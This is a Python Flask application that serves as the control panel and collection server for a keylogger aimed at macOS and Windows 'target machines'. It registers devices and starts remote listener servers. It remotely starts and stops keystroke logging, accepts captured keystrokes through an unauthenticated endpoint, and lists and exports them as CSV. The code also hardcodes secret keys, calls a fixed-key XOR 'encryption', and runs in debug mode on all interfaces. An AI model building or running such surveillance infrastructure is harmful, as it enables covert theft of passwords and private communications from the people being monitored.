from flask import Flask, request, jsonify, render_template, url_for, flash, redirect, abort
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from datetime import datetime, timedelta
from config import Config
from models import User, Post, Log, db, Feature, FAQ, Newsletter, Device, KeyLog
import smtplib, os
from dotenv import load_dotenv
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from sqlalchemy import or_
import logging
from werkzeug.exceptions import InternalServerError
from flask_migrate import Migrate
from flask_wtf import FlaskForm
from wtforms import StringField, TextAreaField
from wtforms.validators import DataRequired
from flask import make_response, request
from keylogger.macos_keylogger import KeyLogger
from flask_sqlalchemy import SQLAlchemy
import sqlite3
import platform
from keylogger.windows_keylogger import KeyLogger as WindowsKeyLogger
from keylogger.macos_keylogger import KeyLogger as MacKeyLogger
from flask_wtf.csrf import CSRFProtect
import uuid
from sqlalchemy import event
from sqlalchemy.engine import Engine
import socket
import json
import threading
from keylogger.remote_server import KeyloggerServer


load_dotenv()


app = Flask(__name__)
app.config.from_object(Config)
app.config['SECRET_KEY'] = 'dev-key-12345'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///keylogger.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['WTF_CSRF_SECRET_KEY'] = 'csrf-key-12345'
app.config['WTF_CSRF_ENABLED'] = True
csrf = CSRFProtect(app)

year = datetime.now().year

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'keylogger.db')

os.makedirs(DATA_DIR, exist_ok=True)

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'

db.init_app(app)
migrate = Migrate(app, db)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
login_manager.login_message = 'Please log in to access this page.'

with app.app_context():
    db.create_all()

@login_manager.user_loader
def load_user(id):
    return User.query.get(int(id))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('macos'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        remember = request.form.get('remember') == 'on'
        
        user = User.query.filter_by(email=email).first()
        if user and user.check_password(password):
            login_user(user, remember=remember)
            next_page = request.args.get('next')
            if next_page and next_page.startswith('/'):  
                return redirect(next_page)
            return redirect(url_for('macos'))
        
        flash('Invalid email or password')
    
    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if current_user.is_authenticated:
        return redirect(url_for('macos'))
    
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        
        if User.query.filter_by(email=email).first():
            flash('Email already registered')
            return render_template('signup.html')
        
        user = User(name=name, email=email)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()
        
        flash('Registration successful! Please log in.')
        return redirect(url_for('login'))
    
    return render_template('signup.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.')
    return redirect(url_for('login'))

@app.route('/logs_history')
@login_required
def logs_history():
    return render_template('logs_history.html')

@app.route('/features')
def features():
    return render_template('features.html')

@app.route('/macos')
@login_required
def macos():
    return render_template('macos.html')

@app.route('/windows')
@login_required
def windows():
    return render_template('windows.html')

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        message = request.form.get('message')
        copy = request.form.get('copy')
        
        if not all([name, email, message]):
            flash('Please fill all required fields')
            return render_template('contact.html')
        
        msg = MIMEMultipart()
        msg['From'] = os.getenv("EMAIL")
        msg['To'] = os.getenv("EMAIL")
        msg['Subject'] = "New Message"
        
        body = f"Name: {name}\nEmail: {email}\nMessage: {message}"
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        try:
            connection = smtplib.SMTP('smtp.gmail.com', 587)
            connection.starttls()
            connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
            connection.send_message(msg)
            
            
            if copy:
                send_copy = MIMEMultipart()
                send_copy['From'] = os.getenv("EMAIL")
                send_copy['To'] = email
                send_copy['Subject'] = "Copy of your message"
                body_copy = f"Hello {name},\n\nThank you for contacting us. Here is a copy of your message:\n\n{message}\n\nBest regards,\nThe Team"
                send_copy.attach(MIMEText(body_copy, 'plain', 'utf-8'))
                connection.send_message(send_copy)
            
            connection.quit()
            flash('Message sent successfully!')
            
        except Exception as e:
            flash('An error occurred while sending the message. Please try again later.')
            print(f"Error: {e}")  
            return render_template('contact.html')
            
        return redirect(url_for('contact'))
        
    return render_template('contact.html')

@app.route('/subscribe', methods=['POST'])
def subscribe_newsletter():
    email = request.form.get('newsletter1')
    
    if not email:
        flash('Please enter an email address')
        return redirect(request.referrer or url_for('home'))
    
    
    existing_subscriber = Newsletter.query.filter_by(email=email).first()
    if existing_subscriber:
        if existing_subscriber.is_active:
            flash('Email already subscribed')
        else:
            existing_subscriber.is_active = True
            db.session.commit()
            flash('Subscription reactivated successfully!')
        return redirect(request.referrer or url_for('home'))
    
    
    subscriber = Newsletter(email=email)
    db.session.add(subscriber)
    
    try:
        db.session.commit()
        
        
        msg = MIMEMultipart()
        msg['From'] = os.getenv("EMAIL")
        msg['To'] = email
        msg['Subject'] = "Welcome to Our Newsletter!"
        
        body = """Thank you for subscribing to our newsletter!
        
You'll receive monthly updates about what's new and exciting from us.

Best regards,
The Team"""
        
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        connection = smtplib.SMTP('smtp.gmail.com', 587)
        connection.starttls()
        connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
        connection.send_message(msg)
        connection.quit()
        
        flash('Successfully subscribed to newsletter!')
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Newsletter subscription error: {str(e)}")
        flash('An error occurred. Please try again later.')
    
    return redirect(request.referrer or url_for('home'))

class NewsletterForm(FlaskForm):
    subject = StringField('Subject', validators=[DataRequired()])
    content = TextAreaField('Content', validators=[DataRequired()])

@app.route('/admin/send-newsletter', methods=['GET', 'POST'])
@login_required
def send_newsletter():
    if not current_user.is_active or not current_user.email in ['motiwolff@gmail.com']:
        abort(403)
    
    form = NewsletterForm()
    
    if request.method == 'POST':
        if form.validate_on_submit():
            subject = form.subject.data
            content = form.content.data
            action = request.form.get('action')
            
            if action == 'preview':
                return render_template('admin/send_newsletter.html', 
                                    form=form,
                                    preview=True,
                                    subject=subject,
                                    content=content)
            
            elif action == 'send':
                subscribers = Newsletter.query.filter_by(is_active=True).all()
                
                if not subscribers:
                    flash('No active subscribers found.')
                    return render_template('admin/send_newsletter.html', form=form)
                
                try:
                    connection = smtplib.SMTP('smtp.gmail.com', 587)
                    connection.starttls()
                    connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
                    
                    for subscriber in subscribers:
                        msg = MIMEMultipart()
                        msg['From'] = os.getenv("EMAIL")
                        msg['To'] = subscriber.email
                        msg['Subject'] = subject
                        
                        unsubscribe_url = url_for('unsubscribe_newsletter', 
                                                email=subscriber.email, 
                                                _external=True)
                        
                        body = f"{content}\n\nTo unsubscribe, click here: {unsubscribe_url}"
                        msg.attach(MIMEText(body, 'plain', 'utf-8'))
                        
                        connection.send_message(msg)
                    
                    connection.quit()
                    flash(f'Newsletter sent successfully to {len(subscribers)} subscribers!')
                    return redirect(url_for('send_newsletter'))
                    
                except Exception as e:
                    app.logger.error(f"Newsletter sending error: {str(e)}")
                    flash('An error occurred while sending the newsletter.')
        else:
            for field, errors in form.errors.items():
                for error in errors:
                    flash(f'{field}: {error}')
    
    return render_template('admin/send_newsletter.html', form=form)

@app.route('/unsubscribe/<email>')
def unsubscribe_newsletter(email):
    subscriber = Newsletter.query.filter_by(email=email).first()
    
    if subscriber:
        subscriber.is_active = False
        db.session.commit()
        flash('Successfully unsubscribed from newsletter')
    
    return redirect(url_for('home'))

@app.route('/privacy')
def privacy():
    return render_template('privacy.html', year=year)

@app.route('/terms')
def terms():
    return render_template('terms.html', year=year)

@app.route('/faqs')
def faqs():
    return render_template('faqs.html')

@app.route('/accessability')
def accessability():
    return render_template('accessability.html', year=year)

@app.route('/team')
def team():
    return render_template('team.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/quickstart')
def quickstart():
    return render_template('quickstart.html')

@app.route('/billing')
def billing():
    return render_template('billing.html')

@app.route('/set-cookie-preference', methods=['POST'])
def set_cookie_preference():
    preference = request.json.get('preference')
    response = make_response({'status': 'success'})
    response.set_cookie('cookie_consent', preference, max_age=365*24*60*60)  # 1 year
    return response

@app.route('/test404')
def test404():
    # Force a 404 error
    abort(404)

@app.route('/test500')
def test500():
    try:
        # Force a 500 error
        x = 1 / 0
        return x
    except Exception as e:
        app.logger.error(f"Test 500 error: {str(e)}")
        raise InternalServerError()

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    app.logger.error(f'Server Error: {e}')
    return render_template('500.html'), 500

# Optional: Configure logging
if not app.debug:
    # Set up logging to file
    file_handler = logging.FileHandler('error.log')
    file_handler.setLevel(logging.ERROR)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(formatter)
    app.logger.addHandler(file_handler)

REMOTE_CONNECTIONS = {}  
REMOTE_SERVERS = {} 

def start_remote_server(device_id):
    # Find an available port (starting from 12345)
    port = 12345
    while port < 13345: 
        try:
            server = KeyloggerServer(host='0.0.0.0', port=port, db_path=DB_PATH)
            REMOTE_SERVERS[device_id] = server
            REMOTE_CONNECTIONS[device_id] = ('0.0.0.0', port)
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=server.start)
            server_thread.daemon = True
            server_thread.start()
            
            app.logger.info(f"Started remote server for device {device_id} on port {port}")
            return port
            
        except OSError:  
            port += 1
    
    raise Exception("No available ports found")

@app.route('/api/register_device', methods=['POST'])
@login_required
def register_device():
    try:
        data = request.get_json()
        device_type = data.get('type', 'macos')
        
        # Generate a new device
        device = Device(
            user_id=current_user.id,
            os_info=device_type,
            name=f"New {device_type.capitalize()} Device"
        )
        db.session.add(device)
        db.session.commit()
        
        if device_type == 'windows':
            # Start a remote server for this device
            try:
                port = start_remote_server(device.device_id)
                # Get the server's IP address or hostname
                host = request.host.split(':')[0]  # Remove port if present
                return jsonify({
                    'device_id': device.device_id,
                    'port': port,
                    'host': host
                })
            except Exception as e:
                db.session.delete(device)
                db.session.commit()
                raise Exception(f"Failed to start remote server: {str(e)}")
        
        return jsonify({'device_id': device.device_id})
        
    except Exception as e:
        app.logger.error(f"Error registering device: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/get_target_machines_list')
@login_required
def get_target_machines_list():
    # Get only active devices for the current user
    hour_ago = datetime.utcnow() - timedelta(hours=1)
    devices = Device.query.filter(
        Device.user_id == current_user.id
    ).all()
    
    return jsonify([{
        "device_id": device.device_id,
        "name": device.name,
        "is_active": device.is_active,
        "status": {
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "battery_level": device.battery_level,
            "os_info": device.os_info,
            "hostname": device.hostname,
            "ip_address": device.ip_address
        }
    } for device in devices])

def get_keylogger_class():
    system = platform.system().lower()
    if system == 'windows':
        from keylogger.windows_keylogger import KeyLogger
        return KeyLogger
    elif system == 'darwin':
        from keylogger.macos_keylogger import KeyLogger
        return KeyLogger
    else:
        raise NotImplementedError(f"Keylogger not implemented for {system}")

# Add this near your other Flask configurations
keylogger_instance = None

@app.route('/api/toggle_logging', methods=['POST'])
@login_required
def toggle_logging():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        action = data.get('action')
        
        if not device_id or not action:
            return jsonify({'error': 'Missing device_id or action'}), 400
            
        device = Device.query.filter_by(
            device_id=device_id,
            user_id=current_user.id
        ).first()
        
        if not device:
            return jsonify({'error': 'Device not found'}), 404
            
        if action == 'start':
            if device.is_logging:
                return jsonify({'error': 'Device is already logging'}), 400
                
            # Initialize keylogger if needed
            global keylogger_instance
            if keylogger_instance is None:
                keylogger_instance = KeyLogger(DB_PATH)
            
            result = keylogger_instance.start_logging(device_id)
            if "successfully" in result:
                device.is_logging = True
                db.session.commit()
                return jsonify({'status': 'success', 'message': result})
            else:
                return jsonify({'error': result}), 500
                
        elif action == 'stop':
            if not device.is_logging:
                return jsonify({'error': 'Device is not logging'}), 400
                
            if keylogger_instance:
                result = keylogger_instance.stop_logging()
                if "successfully" in result:
                    device.is_logging = False
                    db.session.commit()
                    return jsonify({'status': 'success', 'message': result})
                else:
                    return jsonify({'error': result}), 500
            else:
                return jsonify({'error': 'Keylogger not initialized'}), 500
                
        else:
            return jsonify({'error': 'Invalid action'}), 400
            
    except Exception as e:
        app.logger.error(f"Error in toggle_logging: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/status', methods=['POST'])
@login_required
def update_device_status():
    data = request.get_json()
    device_id = data.get('device_id')
    
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({"error": "Device not found"}), 404
            
        # Update device status
        device.last_seen = datetime.utcnow()
        device.is_active = True
        device.os_info = data.get('os_info')
        device.hostname = data.get('hostname')
        device.battery_level = data.get('battery_level')
        device.ip_address = request.remote_addr
        
        db.session.commit()
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        app.logger.error(f"Error updating device status: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/device/info/<device_id>')
@login_required
def get_device_info(device_id):
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({"error": "Device not found"}), 404
            
        return jsonify({
            "id": device.device_id,
            "name": device.name,
            "status": {
                "is_active": device.is_active,
                "last_seen": device.last_seen.isoformat() if device.last_seen else None,
                "battery_level": device.battery_level,
                "os_info": device.os_info,
                "hostname": device.hostname,
                "ip_address": device.ip_address
            }
        })
        
    except Exception as e:
        app.logger.error(f"Error getting device info: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/remove_device', methods=['POST'])
@login_required
def remove_device():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
            
        device = Device.query.filter_by(
            device_id=device_id,
            user_id=current_user.id
        ).first()
        
        if not device:
            return jsonify({'error': 'Device not found'}), 404
            
        try:
            # First delete associated keystrokes
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("DELETE FROM keystrokes WHERE device_id = ?", (device_id,))
            conn.commit()
            conn.close()
            
            # Stop remote server if it's a Windows device
            if device.os_info == 'windows' and device_id in REMOTE_SERVERS:
                try:
                    server = REMOTE_SERVERS[device_id]
                    server.stop()
                    del REMOTE_SERVERS[device_id]
                    del REMOTE_CONNECTIONS[device_id]
                except Exception as e:
                    app.logger.warning(f"Error stopping remote server: {str(e)}")
            
            # Finally delete the device
            db.session.delete(device)
            db.session.commit()
            
            return jsonify({'status': 'success', 'message': 'Device removed successfully'})
            
        except Exception as e:
            db.session.rollback()
            raise e
            
    except Exception as e:
        app.logger.error(f"Error removing device: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/get_keystrokes')
@login_required
def get_keystrokes():
    device_id = request.args.get('machine')
    show_encrypted = request.args.get('encrypted', 'false').lower() == 'true'
    
    app.logger.info(f"Fetching keystrokes for device: {device_id}")
    
    if not device_id:
        return jsonify({"error": "Machine parameter is required"}), 400
    
    try:
        # Get logs from keylogger.db
        db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
        app.logger.info(f"Using database at: {db_path}")
        
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        
        # Get logs for specific device
        c.execute("""
            SELECT timestamp, content 
            FROM keystrokes 
            WHERE device_id = ? 
            ORDER BY timestamp DESC
        """, (device_id,))
        
        logs = c.fetchall()
        conn.close()
        
        app.logger.info(f"Found {len(logs)} logs for device {device_id}")
        
        if show_encrypted:
            # Simple XOR encryption with a fixed key
            key = "SECRET_KEY"  # You can change this key
            log_data = []
            for timestamp, content in logs:
                encrypted_content = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))
                log_data.append(f"[{timestamp}] {encrypted_content}")
        else:
            log_data = [f"[{timestamp}] {content}" for timestamp, content in logs]
        
        return jsonify({"data": '\n'.join(log_data) if logs else "No logs available"})
        
    except Exception as e:
        app.logger.error(f"Error in get_keystrokes: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs/<device_id>')
@login_required
def get_logs(device_id):
    try:
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            return jsonify({'error': 'Device not found'}), 404
            
        # Connect directly to the database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT timestamp, content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC",
                 (device_id,))
        rows = c.fetchall()
        conn.close()
        
        # Format the logs
        logs = [f"[{row[0]}] {row[1]}" for row in rows]
        
        app.logger.debug(f"Retrieved {len(logs)} logs for device {device_id}")
        return jsonify(logs)
        
    except Exception as e:
        app.logger.error(f"Error getting logs: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/client/log_keystrokes', methods=['POST'])
def client_log_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        keystrokes = data.get('content')
        timestamp = data.get('timestamp')
        
        if not all([device_id, keystrokes, timestamp]):
            return jsonify({'error': 'Missing required fields'}), 400
            
        log = KeyLog(
            device_id=device_id,
            keystrokes=keystrokes,
            timestamp=datetime.strptime(timestamp, "%Y-%m-%d %H:%M")
        )
        db.session.add(log)
        db.session.commit()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Error logging keystrokes from client: {str(e)}")
        return jsonify({'error': str(e)}), 500

# Add this near your other Flask configurations
@event.listens_for(Engine, "connect")
def set_sqlite_pragma(dbapi_connection, connection_record):
    cursor = dbapi_connection.cursor()
    cursor.execute("PRAGMA foreign_keys=ON")
    cursor.close()

@app.route('/api/devices', methods=['GET'])
@login_required
def get_devices():
    device_type = request.args.get('type', 'all')
    try:
        query = Device.query.filter_by(user_id=current_user.id)
        if device_type != 'all':
            query = query.filter_by(os_info=device_type)
            
        devices = query.all()
        return jsonify([{
            'id': d.device_id,
            'name': d.name,
            'os_info': d.os_info,
            'is_active': d.is_active,
            'is_logging': d.is_logging
        } for d in devices])
    except Exception as e:
        app.logger.error(f"Error getting devices: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/toggle_encryption', methods=['POST'])
@login_required
def toggle_encryption():
    try:
        data = request.get_json()
        device_id = data.get('device_id')

        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400

        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({'error': 'Device not found'}), 404

        # Toggle encryption
        device.is_encrypted = not device.is_encrypted
        db.session.commit()

        return jsonify({
            'status': 'success',
            'is_encrypted': device.is_encrypted,
            'message': f'Encryption {"enabled" if device.is_encrypted else "disabled"}'
        })

    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Error toggling encryption: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/log_keystrokes', methods=['POST'])
@login_required
def log_keystrokes():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        keystrokes = data.get('keystrokes')
        
        if not device_id or not keystrokes:
            return jsonify({'error': 'Missing device_id or keystrokes'}), 400
            
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({'error': 'Device not found'}), 404
            
        if not device.is_logging:
            return jsonify({'error': 'Logging is not enabled for this device'}), 400
            
        log = KeyLog(device_id=device_id, keystrokes=keystrokes)
        db.session.add(log)
        db.session.commit()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Error logging keystrokes: {str(e)}")
        return jsonify({'error': str(e)}), 500
    
    
@app.route('/api/logs')
@login_required
def get_filtered_logs():
    device_id = request.args.get('device_id', '')
    date_from = request.args.get('from', '')
    date_to = request.args.get('to', '')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    
    try:
        # Start with base query
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        # Build query parts
        query = """
            SELECT k.id, k.device_id, k.timestamp, k.content, d.os_info as device_type
            FROM keystrokes k
            JOIN device d ON k.device_id = d.device_id
            WHERE 1=1
        """
        params = []
        
        # Add filters
        if device_id:
            query += " AND k.device_id = ?"
            params.append(device_id)
        
        if date_from:
            query += " AND k.timestamp >= ?"
            params.append(date_from)
            
        if date_to:
            query += " AND k.timestamp <= ?"
            params.append(date_to)
            
        # Add user filter - only show logs for devices belonging to current user
        query += " AND d.user_id = ?"
        params.append(current_user.id)
        
        # Count total for pagination
        count_query = query.replace("k.id, k.device_id, k.timestamp, k.content, d.os_info as device_type", "COUNT(*)")
        c.execute(count_query, params)
        total_count = c.fetchone()[0]
        
        # Add ordering and pagination
        query += " ORDER BY k.timestamp DESC LIMIT ? OFFSET ?"
        params.extend([per_page, (page - 1) * per_page])
        
        # Execute query
        c.execute(query, params)
        logs = [dict(row) for row in c.fetchall()]
        
        conn.close()
        
        return jsonify({
            'logs': logs,
            'total': total_count,
            'page': page,
            'per_page': per_page,
            'total_pages': (total_count + per_page - 1) // per_page
        })
        
    except Exception as e:
        app.logger.error(f"Error getting logs: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/stats')
@login_required
def get_logs_stats():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Get total logs count
        c.execute("""
            SELECT COUNT(*) FROM keystrokes k
            JOIN device d ON k.device_id = d.device_id
            WHERE d.user_id = ?
        """, (current_user.id,))
        total_logs = c.fetchone()[0]
        
        # Get active devices count
        c.execute("""
            SELECT COUNT(*) FROM device
            WHERE user_id = ? AND is_active = 1
        """, (current_user.id,))
        active_devices = c.fetchone()[0]
        
        # Get macOS devices count
        c.execute("""
            SELECT COUNT(*) FROM device
            WHERE user_id = ? AND os_info = 'macos'
        """, (current_user.id,))
        macos_devices = c.fetchone()[0]
        
        # Get Windows devices count
        c.execute("""
            SELECT COUNT(*) FROM device
            WHERE user_id = ? AND os_info = 'windows'
        """, (current_user.id,))
        windows_devices = c.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'total_logs': total_logs,
            'active_devices': active_devices,
            'macos_devices': macos_devices,
            'windows_devices': windows_devices
        })
        
    except Exception as e:
        app.logger.error(f"Error getting stats: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
@login_required
def delete_log(log_id):
    try:
        # First check if the log belongs to a device owned by the current user
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute("""
            SELECT k.id FROM keystrokes k
            JOIN device d ON k.device_id = d.device_id
            WHERE k.id = ? AND d.user_id = ?
        """, (log_id, current_user.id))
        
        result = c.fetchone()
        if not result:
            conn.close()
            return jsonify({'error': 'Log not found or access denied'}), 404
        
        # Delete the log
        c.execute("DELETE FROM keystrokes WHERE id = ?", (log_id,))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        app.logger.error(f"Error deleting log: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/export')
@login_required
def export_logs():
    device_id = request.args.get('device_id', '')
    date_from = request.args.get('from', '')
    date_to = request.args.get('to', '')
    
    try:
        # Start with base query
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Build query parts
        query = """
            SELECT k.timestamp, k.device_id, d.os_info, k.content
            FROM keystrokes k
            JOIN device d ON k.device_id = d.device_id
            WHERE d.user_id = ?
        """
        params = [current_user.id]
        
        # Add filters
        if device_id:
            query += " AND k.device_id = ?"
            params.append(device_id)
        
        if date_from:
            query += " AND k.timestamp >= ?"
            params.append(date_from)
            
        if date_to:
            query += " AND k.timestamp <= ?"
            params.append(date_to)
            
        # Add ordering
        query += " ORDER BY k.timestamp DESC"
        
        # Execute query
        c.execute(query, params)
        logs = c.fetchall()
        
        conn.close()
        
        # Create CSV in memory
        import io
        import csv
        from flask import make_response
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow(['Timestamp', 'Device ID', 'Device Type', 'Content'])
        
        # Write data
        for log in logs:
            writer.writerow(log)
        
        # Create response
        response = make_response(output.getvalue())
        response.headers["Content-Disposition"] = "attachment; filename=keylogger_logs.csv"
        response.headers["Content-type"] = "text/csv"
        
        return response
        
    except Exception as e:
        app.logger.error(f"Error exporting logs: {str(e)}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=12345, debug=True)